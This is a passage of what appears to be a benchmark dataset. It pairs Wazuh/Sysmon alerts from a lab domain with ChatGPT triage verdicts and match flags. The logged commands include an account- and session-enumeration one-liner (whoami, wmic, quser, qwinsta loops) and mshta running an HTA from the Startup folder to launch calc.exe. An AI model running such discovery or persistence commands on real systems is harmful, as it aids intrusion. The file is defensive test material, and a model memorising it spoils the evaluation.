SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}\r\nParentProcessId: 9176\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:57.8710770Z", "eventRecordID": "395419", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 17, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720578.2169402", "timestamp": "2025-07-05T13:02:58.759+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:58.759Z"]}, "sort": [1751720578759]}, "chatgpt_response": {"alert_id": "x6mu2pcBGfDWR0X_074N", "classification": "TP", "priority": "High", "justification": "This alert is triggered by Microsoft-Windows-Sysmon on a Windows endpoint (Win11Client) for a suspicious command-line execution involving 'qwinsta', which is used to enumerate active sessions and user accounts. The activity aligns with MITRE ATT&CK techniques T1087 (Account Discovery) and T1059.003 (Windows Command Shell), indicating potential lateral movement or credential harvesting. The process has high integrity level, and the command is attempting to gather user and session information from the system, which is suspicious and warrants immediate investigation. Therefore, it is classified as a True Positive (TP) with High priority."}, "chatgpt_classification": "TP", "chatgpt_priority": "High", "chatgpt_justification": "This alert is triggered by Microsoft-Windows-Sysmon on a Windows endpoint (Win11Client) for a suspicious command-line execution involving 'qwinsta', which is used to enumerate active sessions and user accounts. The activity aligns with MITRE ATT&CK techniques T1087 (Account Discovery) and T1059.003 (Windows Command Shell), indicating potential lateral movement or credential harvesting. The process has high integrity level, and the command is attempting to gather user and session information from the system, which is suspicious and warrants immediate investigation. Therefore, it is classified as a True Positive (TP) with High priority.", "classification_match": true, "priority_match": false}
{"id": "ixdg15cB1Hp-jZ7fLLFL", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "ixdg15cB1Hp-jZ7fLLFL", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-4897-6868-1905-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\WINDOWS\\\\system32\\\\mshta.exe\\\" \\\"C:\\\\Users\\\\snell\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1218.005.hta\\\"", "processGuid": "{ff3427f9-4898-6868-1a05-000000001400}", "logonId": "0xa45f0", "parentProcessId": "8516", "processId": "8740", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:33:12.106", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\mshta.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" /c calc.exe", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:33:12.106\r\nProcessGuid: {ff3427f9-4898-6868-1a05-000000001400}\r\nProcessId: 8740\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"C:\\Windows\\System32\\cmd.exe\" /c calc.exe\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-4897-6868-1905-000000001400}\r\nParentProcessId: 8516\r\nParentImage: C:\\Windows\\System32\\mshta.exe\r\nParentCommandLine: \"C:\\WINDOWS\\system32\\mshta.exe\" \"C:\\Users\\snell\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:33:12.1198879Z", "eventRecordID": "389139", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 30, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665092.62714894", "timestamp": "2025-07-04T21:38:12.514+0000"}, "fields": {"timestamp": ["2025-07-04T21:38:12.514Z"]}, "sort": [1751665092514]}, "chatgpt_response": {"alert_id": "ixdg15cB1Hp-jZ7fLLFL", "classification": "TP", "priority": "High", "justification": "The alert is generated by Sysmon for a 'Process Create' event where the Windows Command Processor (cmd.exe) is launched via a suspicious or abnormal parent process (mshta.exe executing an HTA file from AppData Roaming). This matches technique T1059.003 (Windows Command Shell) from MITRE ATT&CK, which is commonly used by attackers to execute commands under the guise of legitimate processes. The presence of multiple hash values and the context of a potential Living-off-the-land binary (mshta.exe) invoking a suspicious HTA file increases the likelihood of malicious activity. This warrants a High priority for immediate investigation and response."}, "chatgpt_classification": "TP", "chatgpt_priority": "High", "chatgpt_justification": "The alert is generated by Sysmon for a 'Process Create' event where the Windows Command Processor (cmd.exe) is launched via a suspicious or abnormal parent process (mshta.exe executing an HTA file from AppData Roaming). This matches technique T1059.003 (Windows Command Shell) from MITRE ATT&CK, which is commonly used by attackers to execute commands under the guise of legitimate processes. The presence of multiple hash values and the context of a potential Living-off-the-land binary (mshta.exe) invoking a suspicious HTA file increases the likelihood of malicious activity. This warrants a High priority for immediate investigation and response.", "classification_match": true, "priority_match": false}
